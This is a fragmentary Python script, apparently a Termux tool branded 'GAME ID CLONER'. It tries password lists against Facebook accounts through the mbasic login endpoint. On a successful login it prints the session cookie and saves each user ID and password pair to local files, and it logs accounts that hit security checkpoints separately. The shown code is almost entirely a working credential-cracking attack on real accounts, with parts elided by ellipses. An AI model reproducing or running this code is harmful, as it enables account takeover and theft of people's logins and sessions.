#SC MAKED BY SNIGDHO AFRIDI 🤣 and Fuked By FB-KING 🙄
...
╔═════════════════════════════════════════════╗
║  [+] AUTHOR   : TERMUX TERMINAL         ║
║  [+] WHATSAPP : +8801848266826              ║
║  [+] TOOL 🔥     : GAME ID CLONER       ║
║  [+] CREATOR  : TERMUX TERMINAL                     ║
║  [+] VERSION  : 1.0.1                       ║
╚═════════════════════════════════════════════╝""")
...
class Main:
    def __init__(self):
        ...
        self.loop = 0
        os.system("clear")
        os.system('xdg-open https://facebook.com/groups/1806451589738462/')
        print(logo)
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mTERMUX\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent':pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[TERMUX-OK💔] {uid}|{ps}")
                print(f" \n Cookie : {coki}")
                print(f" \n ══════════════════════════════════════════")
                open('/sdcard/TERMUX/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[TERMUX-CP🔒] {uid}|{ps}")
                open('/sdcard/TERMUX-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[TERMUX 💔] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()